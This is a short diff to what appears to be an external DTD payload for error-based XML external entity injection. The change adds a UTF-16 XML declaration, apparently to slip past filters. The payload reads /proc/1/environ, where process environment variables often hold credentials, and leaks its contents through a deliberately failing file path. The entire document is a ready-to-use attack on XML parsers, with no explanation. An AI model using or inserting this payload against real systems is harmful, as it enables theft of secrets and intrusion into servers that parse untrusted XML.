@@ -1,3 +1,4 @@
+<?xml version='1.0' encoding='utf-16'?>
 <!ENTITY % file SYSTEM "file:///proc/1/environ">
 <!ENTITY % eval '<!ENTITY &#x25; error SYSTEM &#x27;file:///nonexistent/%file;&#x27;>'>
 %eval;
